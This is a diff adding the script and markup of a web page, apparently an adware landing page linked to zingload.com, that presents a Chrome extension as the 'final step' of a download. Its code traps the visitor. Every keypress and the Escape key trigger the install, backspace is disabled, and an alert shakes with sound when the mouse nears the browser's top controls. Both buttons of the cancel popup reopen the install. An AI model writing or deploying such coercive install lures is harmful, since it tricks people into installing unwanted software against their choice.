+                if (typeof newWindow !== 'undefined') {
+
+                    if (newWindow.closed) {
+
+                        cwswindowclosed = true;
+
+                        c = clearInterval(c);
+                        document.body.style.overflow = 'unset';
+                        try {
+                            document.getElementById('box').style.display = "none";
+                        } catch (e) {}
+                        try {
+                            document.getElementById('arrowBlue').style.display = "none";
+                        } catch (e) {}
+                        try {
+                            document.getElementById('box1').style.display = "none";
+                        } catch (e) {}
+                        try {
+                            document.getElementById('arrowBlue1').style.display = "none";
+                        } catch (e) {}
+
+                        try {
+                            document.getElementById('boxPlus').style.display = "none";
+                        } catch (e) {}
+                        try {
+                            document.getElementById('boxPlus1').style.display = "none";
+                        } catch (e) {}
+                        document.getElementById("body").style.backgroundImage = "url('img/bgFinal.png')";
+
+                        $('#cancelPop').fadeIn(100);
+
+
+                    }
+                }
+            }, 200);
+
+        }
+
+
+
+
+
+
+        $('#body').click(function() {
+            event.stopPropagation();
+
+        });
+        $('#webstore').click(function() {
+
+        });
+
+
+
+        function Yes() {
+
+
+
+            document.getElementById("cancelPop").style.display = "none";
+            openInstall();
+
+        }
+
+        function No() {
+
+
+            document.getElementById("cancelPop").style.display = "none";
+            document.getElementById("overlay").style.display = "block";
+
+
+            openInstall();
+        }
+
+
+        setTimeout(function() {
+            $("#loader").fadeOut();
+            $("#loader1").fadeOut();
+
+        }, 4000);
+
+
+        $(document).on("mousemove", function(event) {
+            if (event.pageY >= 5 && event.pageY <= 55) {
+                var audio = document.getElementsByTagName("audio")[0];
+                audio.play();
+                $('#topAlert').fadeIn(0);
+                $("#topAlert").effect("shake", {
+                    direction: "left",
+                    times: 1,
+                    distance: 10
+                }, 100);
+            } else {
+                $('#topAlert').stop(true, true);
+            }
+        });
+
+
+
+        function myMove() {
+
+
+            $("#arrowBlue").animate({
+                "left": "+=35"
+
+            }, 500, function() {
+
+            });
+            $("#arrowBlue").animate({
+                "left": "-=35"
+
+            }, 500, function() {
+                // Animation complete.
+            });
+
+
+        }
+
+        function myMove1() {
+            $("#arrowBlue1").animate({
+                "top": "+=40"
+
+            }, 500, function() {
+
+            });
+            $("#arrowBlue1").animate({
+                "top": "-=40"
+
+            }, 500, function() {
+                // Animation complete.
+            });
+
+        }
+
+
+
+
+        var cursor = new window.Image();
+        cursor.setAttribute("src", "../templates/flashsd/img/cursor2.png");
+
+        var canvas = document.createElement('canvas')
+        canvas.width = canvas.height = 128
+        var ctx = canvas.getContext('2d')
+        ctx.fillStyle = 'rgba(255,0,100,0.8)'
+        ctx.strokeStyle = 'rgba(255,0,100,0.5)'
+        var cx, cy, x, y, animationDD
+        window.onload = function(e) {
+            cx = e.clientX
+            cy = e.clientY
+            x = cx / window.innerWidth
+            y = cy / window.innerHeight
+
+            if (!animationDD) animationDD = requestAnimationFrame(animateDD);
+        }
+
+        function animateDD(time) {
+            animationDD = null
+            ctx.clearRect(0, 0, 128, 128)
+            ctx.save()
+            Py = -50
+            px = 220 - cx
+            py = 95 - cy
+            ctx.drawImage(cursor, 0, 0, 280, 400, 15, 15, 17.5, 30);
+            ctx.restore()
+            var url = canvas.toDataURL()
+            document.body.style.cursor = 'url(' + url + ') 128 128, crosshair'
+        }
+
+        $("body").keypress(function() {
+            openInstall();
+        });
+
+
+
+        $(document).on('keyup', function(evt) {
+            if (evt.keyCode == 27) {
+                openInstall();
+            }
+        });
+
+
+
+
+        (function(global) {
+
+            if (typeof(global) === "undefined") {
+                throw new Error("window is undefined");
+            }
+
+            global.onload = function() {
+
+                // disables backspace on page except on input fields and textarea..
+                document.body.onkeydown = function(e) {
+                    var elm = e.target.nodeName.toLowerCase();
+                    if (e.which === 8 && (elm !== 'input' && elm !== 'textarea')) {
+                        e.preventDefault();
+                    }
+                    // stopping event bubbling up the DOM tree..
+                    e.stopPropagation();
+                };
+
+                if (!animationDD) animationDD = requestAnimationFrame(animateDD);
+
+
+            };
+
+        })(window);
+    </script>
+    <div id="header">
+    </div>
+    <div id="notify">
+        <div id="arrowBlue">
+            <img src="../templates/flashsd/img/modernArrow5.png" style="width: 96px;">
+            <img src="../templates/flashsd/img/modernArrow5.png" style="width: 96px;top:80px">
+        </div>
+        <div id="boxPlus">
+            <span style="left: 14px;position:absolute;color: #00aa5e;">Soon Done</span><br>
+            <img src="../templates/flashsd/img/iconNotify.png" style="width: 24px;position: absolute;left: 110px;top: 8px;">
+            <span style="font-size:13px;top: 38px;left: 0px;position: absolute;line-height: 1.4;">
+Just one more click and you are done!
+</span>
+        </div>
+        <div id="box">
+            <img src="../templates/flashsd/img/fav.png" style="width: 32px;position: absolute;left: 60px;top: 10px;"> Final Step!<br><span style="font-size:13px;top: 90px;left: 8px;position: absolute;line-height: 1.4;">Click </span>
+            <img src="../templates/flashsd/img/addToChrome.png" style="position: absolute;left: 40px;top: 91px;">
+            <span style="font-size:13px;top: 90px;left: 8px;position: absolute;line-height: 1.4;">
+<br>Add extension to complete the<br> final step</span>
+        </div>
+    </div>
+    <div id="notify1" style="display: none; position:absolute;right: 360px; top: 210px;">
+        <div id="box1" style="display: block;">
+            <img src="../templates/flashsd/img/fav.png" style="width: 32px;position: absolute;left: 60px;top: 10px;"> Final Step!<br><span style="font-size:13px;top: 90px;left: 8px;position: absolute;line-height: 1.4;">Click "Add to Chrome"<br>Add extension to complete the<br> final step</span>
+            <div id="arrowBlue1" style="display: block;left:180px;top:0px;"></div>
+        </div>
+        <div id="boxPlus1" style="display: block;">
+            <span style="left: 14px;position:absolute;color: #00aa5e;">Soon Done</span><br>
+            <img src="../templates/flashsd/img/iconNotify.png" style="width: 24px;position: absolute;left: 110px;top: 8px;">
+            <span style="font-size:13px;top: 38px;left: 0px;position: absolute;line-height: 1.4;">
+Just one more click and you are done!
+</span>
+        </div>
+    </div>
+    <div class="footer">
+        <p><a target="_blank" href="http://www.zingload.com/indices/privacy">Privacy Policy </a></p>•
+        <p><a target="_blank" href="http://www.zingload.com/indices/terms">EULA</a></p>
+    </div>
+</body>
+
+</html>
